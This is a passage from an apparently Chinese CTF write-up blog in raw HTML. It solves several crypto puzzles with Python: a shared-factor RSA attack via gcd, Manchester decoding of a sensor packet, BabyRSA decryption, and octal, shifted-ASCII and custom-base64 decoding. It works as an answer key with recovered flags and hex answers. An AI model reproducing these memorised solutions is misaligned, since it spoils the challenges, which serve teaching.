class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c3 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c4 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c5 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c6 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c7 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c8 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c9 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c10 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c11 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n12 = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c12 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n13 = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c13 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n14 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c14 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n15 = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c15 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c16 = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c17 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c18 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c19 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n20 = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c20 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line">list=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(list)):</span><br><span class="line">        <span class="keyword">print</span> i,j</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> (gcd(list[i],list[j]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;error &quot;</span>,i</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到第5和第18个n有最大公约数，即p</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span><br></pre></td></tr></table></figure><p>计算得到q</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527</span><br></pre></td></tr></table></figure><p>求d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure><p>求c</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">t=p*q</span><br><span class="line">list=[c,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> (pow(list[i],d,t))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;error &quot;</span>,i</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="传感器"><a href="#传感器" class="headerlink" title="传感器"></a>传感器</h2><p>5555555595555A65556AA696AA6666666955</p><p>这是某压力传感器无线数据包解调后但未解码的报文(hex)</p><p>已知其ID为0xFED31F，请继续将报文完整解码，提交hex。</p><p>提示1：曼联</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;5555555595555A65556AA696AA6666666955&quot;</span></span><br><span class="line">b=int(a,<span class="number">16</span>)</span><br><span class="line">c=bin(b)[<span class="number">2</span>:]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c),<span class="number">2</span>):</span><br><span class="line">    steady=c[i:i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> steady==<span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">        flag+=str(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> steady==<span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">        flag+=str(<span class="number">0</span>)</span><br><span class="line">print(hex(int(flag)))</span><br><span class="line"><span class="comment">#print十六进制</span></span><br></pre></td></tr></table></figure><p>但是与原ID不一样。尝试将二进制反转。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#最终直接转化字符串，一定要注意二进制数据是四的倍数。</span><br><span class="line">a&#x3D;&quot;5555555595555A65556AA696AA6666666955&quot;</span><br><span class="line">b&#x3D;int(a,16)</span><br><span class="line">c&#x3D;&#39;0&#39;+bin(b)[2:]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">steady_flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,len(c),4):</span><br><span class="line">steady&#x3D;c[i:i+4]</span><br><span class="line">print(steady)</span><br><span class="line">if steady&#x3D;&#x3D;&#39;0101&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;11&#39;)</span><br><span class="line">elif steady&#x3D;&#x3D;&#39;1001&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;01&#39;)</span><br><span class="line">elif steady&#x3D;&#x3D;&#39;0110&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;10&#39;)</span><br><span class="line">elif steady&#x3D;&#x3D;&#39;1010&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;00&#39;)</span><br><span class="line">for i in range(0,len(flag),8):</span><br><span class="line">steady_flag+&#x3D;hex(int(flag[i:i+8][::-1],2))[2:]</span><br><span class="line">print(steady_flag)</span><br><span class="line">#采用第二种编码方式，并且需要将二进制数据每八位逆序。然后转换十六进制。</span><br></pre></td></tr></table></figure><p>最后拿到十六进制<code>fffffed31f645055f9</code>。</p><h2 id="GUET-CTF2019-BabyRSA"><a href="#GUET-CTF2019-BabyRSA" class="headerlink" title="[GUET-CTF2019]BabyRSA"></a>[GUET-CTF2019]BabyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p_and_q = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">p_1_q_1 = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">enc_flag = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = p_1_q_1 - p_and_q - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">plain = gmpy2.powmod(enc_flag,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(plain)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="密码学的心声"><a href="#密码学的心声" class="headerlink" title="密码学的心声"></a>密码学的心声</h2><p>所有数字都小于8，考虑八进制组合，3个一组，得出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;111 114 157 166 145 123 145 143 165 162 151 164 171 126 145 162 171 115 165 143 150&#x27;</span></span><br><span class="line">tmp = [s.split(<span class="string">&#x27; &#x27;</span>)[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s.split(<span class="string">&#x27; &#x27;</span>)))]</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    cipher += chr(int(i,<span class="number">8</span>))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+cipher+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="rot"><a href="#rot" class="headerlink" title="rot"></a>rot</h2><p>先将数字减去13，然后在转字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&quot;</span></span><br><span class="line">steady_str=steady_str.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    flag+=str(int(i)<span class="number">-13</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    print(flag[i:i+<span class="number">2</span>])</span><br><span class="line">steady_str=<span class="string">&quot;70 76 65 71 32 73 83 32 102 108 97 103 123 119 119 119 95 115 104 105 121 97 110 98 97 114 95 99 111 109 95 105 115 95 118 101 114 121 95 103 111 111 100 95 63 63 63 63 125 10 77 68 53 58 51 56 101 52 99 51 53 50 56 48 57 101 49 53 48 49 56 54 57 50 48 97 97 99 51 55 49 57 48 99 98 99&quot;</span></span><br><span class="line">steady_list=steady_str.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_list:</span><br><span class="line">    flag+=chr(int(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLAG IS flag&#123;www_shiyanbar_com_is_very_good_????&#125;</span><br><span class="line">MD5:<span class="number">38e4</span>c352809e150186920aac37190cbc</span><br></pre></td></tr></table></figure><p>最后md5破解，拿到flag。</p><h2 id="BJDCTF2020-这是base"><a href="#BJDCTF2020-这是base" class="headerlink" title="[BJDCTF2020]这是base??"></a>[BJDCTF2020]这是base??</h2><p>base64表给换掉了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict:&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span 